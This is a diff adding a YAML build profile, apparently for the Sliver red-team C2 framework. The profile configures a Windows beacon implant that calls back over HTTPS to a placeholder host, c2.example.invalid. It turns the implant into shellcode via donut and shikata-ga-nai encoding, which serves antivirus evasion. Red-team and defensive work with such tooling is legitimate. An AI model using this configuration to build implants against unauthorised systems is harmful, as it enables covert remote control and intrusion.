@@ -1,0 +1,58 @@
+---
+apiVersion: sliver.bishopfox.com/v1alpha1
+kind: BuildProfile
+metadata:
+  name: windows-shellcode
+  revision: 1
+target:
+  os: windows
+  arch: amd64
+mode: beacon
+c2:
+  endpoints:
+  - protocol: https
+    address: https://c2.example.invalid
+  connectionStrategy: random
+  reconnectSeconds: 60
+  pollTimeoutSeconds: 360
+  maxConnectionErrors: 1000
+  httpC2Profile: default
+core:
+  name: builtin/sliver
+  version: 1.0.0
+  digest: sha256:91dec1eb4394dbc34ab9e0594d7297424cff0d5523e6ab3b3f6d4ba4f90a1af0
+coreOutput:
+  kind: executable
+  container: pe
+  goBuildMode: pie
+coreOptions:
+- name: exports
+  value:
+  - StartW
+- name: limitDomainJoined
+  value: false
+transforms:
+- spec:
+    name: builtin/donut
+    version: 1.0.0
+    digest: sha256:eda20801b552f474a32bb5157fa0260261213286dd46f094fc8bae58547781c3
+  options:
+  - name: entropy
+    value: 3
+  - name: compress
+    value: true
+- spec:
+    name: builtin/shikata-ga-nai
+    version: 1.0.0
+    digest: sha256:630d2624378a7559a7c0fd1dbda0431f8ad3e61071e2756758ce12c93731739a
+  options: []
+finalOutput:
+  format: shellcode
+  artifact:
+    kind: shellcode
+    container: raw
+provider:
+  policy: automatic
+beacon:
+  intervalSeconds: 60
+  jitterSeconds: 30
